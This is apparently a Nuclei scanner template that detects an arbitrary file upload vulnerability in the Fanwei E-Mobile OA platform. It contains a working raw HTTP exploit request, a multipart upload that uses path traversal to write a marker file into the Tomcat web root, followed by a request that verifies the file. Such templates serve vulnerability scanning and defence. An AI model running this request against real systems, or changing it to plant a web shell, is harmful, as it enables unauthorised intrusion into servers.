id: fanweiOA-E-Mobile-lang2sql-file-upload

info:
  name: 泛微OA-E-Mobile移动管理平台lang2sql任意文件上传漏洞
  author: cnaq
  severity: critical
  description: 泛微OA-E-Mobile移动管理平台lang2sql任意文件上传漏洞
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA-E-Mobile%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0lang2sql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
    - http://v10.e-office.cn
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L
    cvss-score: 9.9
    cwe-id: CWE-434
  remediation: Pan Wei has released an update to resolve this vulnerability.
  tags: fanwei,oa,eoffice,fileupload,intrusive

requests:
  - raw:
      - |
        POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
        Content-Length: 265
        Content-Type: multipart/form-data; boundary=00content0boundary00
        Sl-Ce-Suid: 15
        Upgrade-Insecure-Requests: 1
        Accept-Encoding: gzip, deflate, br
        Connection: close

        --00content0boundary00
        Content-Disposition: form-data; name="source"


        --00content0boundary00
        Content-Disposition: form-data; name="file"; filename="../../../../appsvr/tomcat/webapps/ROOT/lang2sql-lGMXG.txt"

        qNZGimiejDiiR5HKHubtm3Ib5WeWUnM6
        --00content0boundary00--

      - |
        GET /lang2sql-lGMXG.txt HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "qNZGimiejDiiR5HKHubtm3Ib5WeWUnM6"

      - type: status
        status:
          - 200

# Enhanced by cs on 2022/02/28
